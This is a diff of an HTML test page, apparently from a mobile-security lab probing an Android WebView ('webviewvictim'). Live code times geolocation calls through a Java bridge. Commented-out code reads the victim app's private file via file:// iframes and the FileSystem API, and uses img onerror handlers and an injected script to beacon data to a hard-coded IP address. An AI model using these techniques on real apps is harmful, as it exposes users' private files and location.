@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -17,6 +18,7 @@
         function getGeoLocationFromJava() {
             AndroidFunction.getLocation();
         }
+
 
     </script>
     <script type="text/javascript">
@@ -44,6 +46,7 @@
             crbsweb.enableDebug();
             crbsweb.showSettings();
         }
+
     </script>
 
     <!--[if lt IE 9]>
@@ -109,7 +112,8 @@
                     <!--<input type="button" id="import" value="导入"/>-->
                 </div>
 
-                <a id="welcome-to-github-pages" class="anchor" href="#welcome-to-github-pages" aria-hidden="true"><span
+                <a id="welcome-to-github-pages" class="anchor" href="#welcome-to-github-pages"
+                   aria-hidden="true"><span
                         class="octicon octicon-link"></span></a>Welcome to GitHub Pages.
             </h3>
             <div style="float: left;width: 50%;">
@@ -127,8 +131,10 @@
             <div id="inner">
             </div>
             <div id="inner2"></div>
-            <p>This automatic page generator is the easiest way to create beautiful pages for all of your projects.
-                Author your page content here using GitHub Flavored Markdown, select a template crafted by a designer,
+            <p>This automatic page generator is the easiest way to create beautiful pages for all of
+                your projects.
+                Author your page content here using GitHub Flavored Markdown, select a template
+                crafted by a designer,
                 and publish. After your page is generated, you can check out the new branch:</p>
             <p>Click the button to get your coordinates.</p>
 
@@ -231,123 +237,124 @@
                             break;
                     }
                 }
+
             </script>
 
             <!--<script>-->
-                <!--// var div = document.createElement('div');-->
-                <!--// // div.innerHTML = "my <b>new</b> skill - <large>DOM maniuplation!</large>";-->
-                <!--// // set style-->
-                <!--// div.style.color = 'red';-->
-                <!--// // better to use CSS though - just set class-->
-                <!--// div.setAttribute('class', 'myclass'); // and make sure myclass has some styles in css-->
-                <!--// var html = "<script> console.log('ZX:div');<\/script>";-->
-                <!--// div.innerHTML = html;-->
-                <!--// document.body.appendChild(div);-->
-                <!--// document.getElementsByTagName("body").innerHTML = div;-->
+            <!--// var div = document.createElement('div');-->
+            <!--// // div.innerHTML = "my <b>new</b> skill - <large>DOM maniuplation!</large>";-->
+            <!--// // set style-->
+            <!--// div.style.color = 'red';-->
+            <!--// // better to use CSS though - just set class-->
+            <!--// div.setAttribute('class', 'myclass'); // and make sure myclass has some styles in css-->
+            <!--// var html = "<script> console.log('ZX:div');<\/script>";-->
+            <!--// div.innerHTML = html;-->
+            <!--// document.body.appendChild(div);-->
+            <!--// document.getElementsByTagName("body").innerHTML = div;-->
 
-                <!--function readfile() {-->
-                    <!--alert(document.getElementById('iframe').contentDocument.body.firstChild.innerHTML);-->
-                    <!--console.debug(document.getElementById('iframe').contentDocument.body.firstChild.innerHTML);-->
-                <!--}-->
+            <!--function readfile() {-->
+            <!--alert(document.getElementById('iframe').contentDocument.body.firstChild.innerHTML);-->
+            <!--console.debug(document.getElementById('iframe').contentDocument.body.firstChild.innerHTML);-->
+            <!--}-->
 
-                <!--function handleFiles() {-->
-                    <!--var selectedFile = document.getElementById("files").files[0];//获取读取的File对象-->
-                    <!--var name = selectedFile.name;//读取选中文件的文件名-->
-                    <!--var size = selectedFile.size;//读取选中文件的大小-->
-                    <!--console.log("文件名:" + name + "大小：" + size);-->
+            <!--function handleFiles() {-->
+            <!--var selectedFile = document.getElementById("files").files[0];//获取读取的File对象-->
+            <!--var name = selectedFile.name;//读取选中文件的文件名-->
+            <!--var size = selectedFile.size;//读取选中文件的大小-->
+            <!--console.log("文件名:" + name + "大小：" + size);-->
 
-                    <!--var reader = new FileReader();//这里是核心！！！读取操作就是由它完成的。-->
-                    <!--reader.readAsText(selectedFile);//读取文件的内容-->
+            <!--var reader = new FileReader();//这里是核心！！！读取操作就是由它完成的。-->
+            <!--reader.readAsText(selectedFile);//读取文件的内容-->
 
-                    <!--reader.onload = function () {-->
-                        <!--console.log(this.result);//当读取完成之后会回调这个函数，然后此时文件的内容存储到了result中。直接操作即可。-->
-                    <!--};-->
-                <!--}-->
+            <!--reader.onload = function () {-->
+            <!--console.log(this.result);//当读取完成之后会回调这个函数，然后此时文件的内容存储到了result中。直接操作即可。-->
+            <!--};-->
+            <!--}-->
             <!--</script>-->
 
             <!--<script>-->
-                <!--function errorHandler(e) {-->
-                    <!--var msg = '';-->
+            <!--function errorHandler(e) {-->
+            <!--var msg = '';-->
 
-                    <!--switch (e.code) {-->
-                        <!--case FileError.QUOTA_EXCEEDED_ERR:-->
-                            <!--msg = 'QUOTA_EXCEEDED_ERR';-->
-                            <!--break;-->
-                        <!--case FileError.NOT_FOUND_ERR:-->
-                            <!--msg = 'NOT_FOUND_ERR';-->
-                            <!--break;-->
-                        <!--case FileError.SECURITY_ERR:-->
-                            <!--msg = 'SECURITY_ERR';-->
-                            <!--break;-->
-                        <!--case FileError.INVALID_MODIFICATION_ERR:-->
-                            <!--msg = 'INVALID_MODIFICATION_ERR';-->
-                            <!--break;-->
-                        <!--case FileError.INVALID_STATE_ERR:-->
-                            <!--msg = 'INVALID_STATE_ERR';-->
-                            <!--break;-->
-                        <!--default:-->
-                            <!--msg = 'Unknown Error';-->
-                            <!--break;-->
-                    <!--}-->
-                    <!--;-->
+            <!--switch (e.code) {-->
+            <!--case FileError.QUOTA_EXCEEDED_ERR:-->
+            <!--msg = 'QUOTA_EXCEEDED_ERR';-->
+            <!--break;-->
+            <!--case FileError.NOT_FOUND_ERR:-->
+            <!--msg = 'NOT_FOUND_ERR';-->
+            <!--break;-->
+            <!--case FileError.SECURITY_ERR:-->
+            <!--msg = 'SECURITY_ERR';-->
+            <!--break;-->
+            <!--case FileError.INVALID_MODIFICATION_ERR:-->
+            <!--msg = 'INVALID_MODIFICATION_ERR';-->
+            <!--break;-->
+            <!--case FileError.INVALID_STATE_ERR:-->
+            <!--msg = 'INVALID_STATE_ERR';-->
+            <!--break;-->
+            <!--default:-->
+            <!--msg = 'Unknown Error';-->
+            <!--break;-->
+            <!--}-->
+            <!--;-->
 
-                    <!--console.log('Error: ' + msg);-->
-                <!--}-->
+            <!--console.log('Error: ' + msg);-->
+            <!--}-->
 
-                <!--window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;-->
-                <!--console.log('requestFileSystem', window.requestFileSystem);-->
-                <!--window.webkitStorageInfo.requestQuota(PERSISTENT, 1024 * 1024, function (grantedBytes) {-->
-                    <!--window.webkitRequestFileSystem(PERSISTENT, grantedBytes, onInitFs, errorHandler);-->
-                <!--}, function (e) {-->
-                    <!--console.log('Error', e);-->
-                <!--});-->
+            <!--window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;-->
+            <!--console.log('requestFileSystem', window.requestFileSystem);-->
+            <!--window.webkitStorageInfo.requestQuota(PERSISTENT, 1024 * 1024, function (grantedBytes) {-->
+            <!--window.webkitRequestFileSystem(PERSISTENT, grantedBytes, onInitFs, errorHandler);-->
+            <!--}, function (e) {-->
+            <!--console.log('Error', e);-->
+            <!--});-->
 
-                <!--function onInitFs(fs) {-->
-                    <!--// console.log('Opened file system: ' + fs.name);-->
-                    <!--// window.requestFileSystem(type, size, successCallback, opt_errorCallback)-->
-                    <!--fs.root.getFile("/data/data/com.example.moslab.webviewvictim/files/abc.txt", {}, function (fileEntry) {-->
-                        <!--fileEntry.file(function (file) {-->
-                            <!--var reader = FileReader();-->
-                            <!--reader.onloadend(function (e) {-->
-                                <!--var txtArea = document.createElement('textarea');-->
-                                <!--txtArea.value = this.result;-->
-                                <!--document.body.appendChild(txtArea);-->
-                            <!--});-->
-                            <!--reader.readAsText(file);-->
-                        <!--}, errorHandler);-->
-                        <!--// fileEntry.isFile === true-->
-                        <!--// fileEntry.name == 'log.txt'-->
-                        <!--// fileEntry.fullPath == '/log.txt'-->
+            <!--function onInitFs(fs) {-->
+            <!--// console.log('Opened file system: ' + fs.name);-->
+            <!--// window.requestFileSystem(type, size, successCallback, opt_errorCallback)-->
+            <!--fs.root.getFile("/data/data/com.example.moslab.webviewvictim/files/abc.txt", {}, function (fileEntry) {-->
+            <!--fileEntry.file(function (file) {-->
+            <!--var reader = FileReader();-->
+            <!--reader.onloadend(function (e) {-->
+            <!--var txtArea = document.createElement('textarea');-->
+            <!--txtArea.value = this.result;-->
+            <!--document.body.appendChild(txtArea);-->
+            <!--});-->
+            <!--reader.readAsText(file);-->
+            <!--}, errorHandler);-->
+            <!--// fileEntry.isFile === true-->
+            <!--// fileEntry.name == 'log.txt'-->
+            <!--// fileEntry.fullPath == '/log.txt'-->
 
-                    <!--}, errorHandler);-->
-                <!--}-->
+            <!--}, errorHandler);-->
+            <!--}-->
 
-                <!--window.requestFileSystem(window.TEMPORARY, 5 * 1024 * 1024 /*5MB*/, onInitFs, errorHandler);-->
+            <!--window.requestFileSystem(window.TEMPORARY, 5 * 1024 * 1024 /*5MB*/, onInitFs, errorHandler);-->
             <!--</script>-->
 
             <!--<iframe src="https://bumoslab.github.io">-->
-                <!--<p>Your browser does not support iframes.</p>-->
+            <!--<p>Your browser does not support iframes.</p>-->
             <!--</iframe>-->
 
             <!--<iframe id='iframe' src="file:///data/data/com.example.moslab.webviewvictim/files/abc.txt"-->
-                    <!--onload='readfile()'></iframe>-->
+            <!--onload='readfile()'></iframe>-->
             <!--<a id='hrefFile' href="file:///data/data/com.example.moslab.webviewvictim/files/abc.txt" onload='readfile()'-->
-               <!--class="button">-->
-                <!--<small>hrefFile</small>-->
+            <!--class="button">-->
+            <!--<small>hrefFile</small>-->
             <!--</a>-->
 
             <!--<pre><code>$ cd your_repo_root/repo_name-->
-<!--$ git fetch origin-->
-<!--$ git checkout gh-pages-->
-<!--</code></pre>-->
+            <!--$ git fetch origin-->
+            <!--$ git checkout gh-pages-->
+            <!--</code></pre>-->
             <!--<div id="http_img"></div>-->
             <!--<script>-->
-                <!--function loc() {-->
-                    <!--b = document.createElement('img');-->
-                    <!--m = "abc";-->
-                    <!--console.log("ZX:" + m);-->
-                    <!--b.src = "http://23.83.235.55:8081/" + m;-->
-                <!--}-->
+            <!--function loc() {-->
+            <!--b = document.createElement('img');-->
+            <!--m = "abc";-->
+            <!--console.log("ZX:" + m);-->
+            <!--b.src = "http://23.83.235.55:8081/" + m;-->
+            <!--}-->
             <!--</script>-->
             <!--<img src=x onerror=loc()>-->
             <!--<script>-->
@@ -365,9 +372,35 @@
             <!--<img src="http://23.83.235.55:8081/images2.jpg">-->
             <script>
                 document.writeln("from writeln");
-                //ZX call geolocation
+                // get high accuracy timer
+                if (window.performance.now) {
+                    console.log("Using high performance timer");
+                    getTimestamp = function() { return window.performance.now(); };
+                } else {
+                    if (window.performance.webkitNow) {
+                        console.log("Using webkit high performance timer");
+                        getTimestamp = function() { return window.performance.webkitNow(); };
+                    } else {
+                        console.log("Using low performance timer");
+                        getTimestamp = function() { return new Date().getTime(); };
+                    }
+                }
+
+                var t1 = getTimestamp();
+                var i;
+                // ZX call geolocation
+                getLocation();
                 // getLocation();
-                getGeoLocationFromJava();
+                // getLocation();
+                // getLocation();
+                // getLocation();
+                // getLocation();
+                // getLocation();
+                // getLocation();
+                // getLocation();
+                // getLocation();
+                var t2 = getTimestamp();
+                console.log("zxRes time: " + (t2 - t1));
             </script>
 
         </section>
@@ -381,11 +414,11 @@
 
 
 <!--<script>-->
-    <!--// var str = "<div></div>";-->
-    <!--var str = "<script> console.log(\"ZX: from console\");b=document.createElement(\'img\'); b.src=\"http://23.83/235.55:8081/def\";<\/script>";-->
-    <!--// var str = "<script> console.log(\"ZX: from console\");<\/script>";-->
-    <!--// document.getElementById('inner').innerHTML = str;-->
-    <!--document.write(str);-->
+<!--// var str = "<div></div>";-->
+<!--var str = "<script> console.log(\"ZX: from console\");b=document.createElement(\'img\'); b.src=\"http://23.83/235.55:8081/def\";<\/script>";-->
+<!--// var str = "<script> console.log(\"ZX: from console\");<\/script>";-->
+<!--// document.getElementById('inner').innerHTML = str;-->
+<!--document.write(str);-->
 <!--</script>-->
 
 <!--<script>-->
